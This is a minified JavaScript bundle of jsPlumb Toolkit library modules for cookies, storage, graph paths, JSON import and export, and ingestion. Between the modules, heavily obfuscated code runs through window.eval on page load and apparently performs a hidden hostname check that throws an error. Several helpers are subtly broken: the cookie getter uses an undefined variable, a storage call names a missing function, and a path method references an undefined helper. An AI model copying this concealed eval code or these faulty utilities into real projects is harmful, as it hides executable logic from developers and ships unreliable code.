.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this;n.jsPlumbToolkit.util={Cookies:{get:function(n){return document.cookie.match(new RegExp(n+"=[a-zA-Z0-9.()=|%/_]+($|;)","g")),val&&0!=val.length&&unescape(val[0].substring(n.length+1,val[0].length).replace(";",""))||null},set:function(n,t,e,o){var i=[n+"="+escape(t),"/",(domain,window.location.host)];return o&&i.push(function(){if("NaN"==parseInt(o))return"";var n=new Date;return n.setTime(n.getTime()+60*parseInt(o)*60*1e3),n.toGMTString()}()),document.cookie=i.join("; ")},unset:function(t,e,o){e=e&&"string"==typeof e?e:"",o=o&&"string"==typeof o?o:"",n.jsPlumbToolkit.util.Cookies.get(t)&&n.jsPlumbToolkit.util.Cookies.set(t,"","Thu, 01-Jan-70 00:00:01 GMT",e,o)}},Storage:{set:function(t,e){"undefined"==typeof localStorage?n.jsPlumbToolkit.util.Cookies.set(t,e):localStorage.setItem(t,e)},get:function(t){return"undefined"==typeof localStorage?n.jsPlumbToolkit.util.Cookies.read(t):localStorage.getItem(t)},clear:function(t){"undefined"==typeof localStorage?n.jsPlumbToolkit.util.Cookies.unset(t):localStorage.removeItem(t)},clearAll:function(){if("undefined"==typeof localStorage);else for(;localStorage.length>0;){var n=localStorage.key(0);localStorage.removeItem(n)}},setJSON:function(t,e){if("undefined"==typeof JSON)throw new TypeError("JSON undefined. Cannot store value.");n.jsPlumbToolkit.util.Storage.set(t,i()(e))},getJSON:function(t){if("undefined"==typeof JSON)throw new TypeError("JSON undefined. Cannot retrieve value.");return JSON.parse(n.jsPlumbToolkit.util.Storage.get(t))}}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this.jsPlumbToolkit,t=this.jsPlumbUtil;n.Path=function(n,e){this.bind=n.bind,this.getModel=n.getModel,this.setSuspendGraph=n.setSuspendGraph,this.getNodeId=n.getNodeId,this.getEdgeId=n.getEdgeId,this.getPortId=n.getPortId,this.getNodeType=n.getNodeType,this.getEdgeType=n.getEdgeType,this.getPortType=n.getPortType;for(var o=n.getGraph().findPath(e.source,e.target,e.strict,e.nodeFilter,e.edgeFilter),i=function(){for(var t=0;t<o.path.length;t++)o.path[t].edge&&n.removeEdge(o.path[t].edge);return this}.bind(this),r=function(){for(var t=0;t<o.path.length;t++)n.removeNode(o.path[t].vertex);return this}.bind(this),d=[],_={},s=0;s<o.path.length;s++)d.push(o.path[s].vertex),_[n.getNodeId(o.path[s].vertex)]=[o.path[s].vertex,s];this.getNodes=function(){return d},this.getNode=function(n){return _["string"==typeof n?n:n.id][0]},this.getAllEdgesFor=function(n){var t=_[n.id][1];return t<o.path.length-1?[o.path[t+1].edge]:[]};var a=function(n,e){for(var i=e||0;i<o.path.length;i++)try{n(i,o.path[i])}catch(n){t.log("Path iterator function failed",n)}};this.each=function(n){a(function(t,e){n(t,e)})},this.eachNode=function(n){a(function(t,e){n(t,e.vertex)})},this.eachEdge=function(n){a(function(t,e){n(t,e.edge)},1)},this.getNodeCount=function(){return o.path.length},this.getNodeAt=function(n){return o.path[n].vertex},this.getEdgeCount=function(){return 0==o.path.length?0:o.path.length-1},this.getEdgeAt=function(n){return n<0&&(n=o.path.length-1+n),o.path.length>n+1?o.path[n+1].edge:null},this.path=o,this.deleteEdges=i,this.deleteNodes=r,this.deleteAll=r,this.isEmpty=function(){return 0==o.path.length},this.getCost=function(){return o.pathDistance},this.contains=function(t,e){var i=n.findGraphObject(t),r=!1;if(i)for(var d=0;d<o.path.length;d++)if(o.path[d].vertex==i||o.path[d].edge==i||!e&&"Port"==o.path[d].vertex.objectType&&o.path[d].vertex.isChildOf(i)){r=!0;break}return r},this.exists=function(){return null!=o.pathDistance},this.selectEdges=function(n){return _selectEdges(n,"getEdges",!1)},this.selectAllEdges=function(n){return _selectEdges(n,"getAllEdges",!0)}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbToolkitIO={},e=n.jsPlumbUtil,o=n.jsPlumb;t.exporters={json:function(n,t){return n.getGraph().serialize()}},t.parsers={json:function(n,t,e){for(var o=n.nodes||[],i=n.edges||[],r=n.ports||[],d=n.groups||[],_=0;_<d.length;_++)t.addGroup(d[_]);for(var s=0;s<o.length;s++)t.addNode(o[s]);for(var a=0;a<r.length;a++)if(r[a].nodeId){var w=t.getNode(r[a].nodeId);if(null==w)throw new TypeError("Unknown node ["+r[a].nodeId+"]");w.addPort(r[a])}for(var l=0;l<i.length;l++){var u={source:i[l].source,target:i[l].target,cost:i[l].cost||1,directed:i[l].directed,data:i[l].data};i[l].geometry&&(u.geometry=i[l].geometry),t.addEdge(u)}},"hierarchical-json":function(n,t,e){!function n(e){var o=t.addNode(e);if(e.children)for(var i=0;i<e.children.length;i++){var r=t.addNode(e.children[i]);t.addEdge({source:o,target:r}),n(e.children[i])}}(n)}},t.managers={json:{removeNode:function(n,t,o){var i=o(t.data);e.removeWithFunction(n.nodes,function(n){return n.id===i})},removeEdge:function(n,t,o){var i=o(t.data);e.removeWithFunction(n.edges,function(n){return n.data&&n.data.id===i})},addNode:function(n,t,e){n.nodes=n.nodes||[],n.nodes.push(t.data)},addEdge:function(n,t,e){var o={source:t.source.getFullId(),target:t.target.getFullId(),data:t.data||{}};n.edges=n.edges||[],n.edges.push(o)},addPort:function(n,t,e){n.ports=n.ports||[];var i=o.extend({},t.port.data||{});i.id=t.port.getFullId(),n.ports.push(i)},removePort:function(n,t,o){var i=t.port.getFullId();e.removeWithFunction(n.ports,function(n){return n.id===i})}}},t.parse=function(n,e,o,i){var r=t.parsers[n];if(null==r)throw new Error("jsPlumb Toolkit - parse - ["+n+"] is an unsupported type");return r(e,o,i)},t.exportData=function(n,e,o){var i=t.exporters[n];if(null===i)throw new Error("jsPlumb Toolkit - exportData - ["+n+"]  is an unsupported type");return i(e,o)},t.manage=function(n,e,o,i,r,d){t.managers[o]&&t.managers[o][n]&&t.managers[o][n](e,i,r)},"undefined"!=typeof exports&&(exports.jsPlumbToolkitIO=t)}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbToolkit;t.Support={ingest:function(e){var o=e.jsPlumb||n.jsPlumb;if(!o.getContainer())throw new TypeError("No Container set on jsPlumb instance. Cannot continue.");var i=t.newInstance(),r=o.select(),d={},_=function(){return"default"},s=e.idFunction||function(n){return o.getId(n)},a=e.typeFunction||_,w=e.idFunction||function(n){return n.id},l=e.edgeTypeFunction||_,u=!1!==e.render,c=function(n){var t=s(n),e=a(n),r=o.getId(n);null==d[r]&&(d[r]=i.addNode({id:t,type:e},null,!0),n.jtk={node:d[r]})};if(e.nodeSelector)for(var B=o.getContainer().querySelectorAll(e.nodeSelector),h=0;h<B.length;h++){var j=o.getId(B[h]);c(B[h]),o.manage(j,B[h])}var p=o.getManagedElements();for(var j in p)c(p[j].el);if(r.each(function(n){!function(n){var t=d[n.sourceId],e=d[n.targetId],o=w(n),r=l(n);n.edge=i.addEdge({source:t,target:e,data:{id:o,type:r}},null,!0)}(n)}),u){var f=n.jsPlumb.extend({},e.renderParams||{});f.jsPlumbInstance=o,f.container=o.getContainer();var g=i.render(f);return 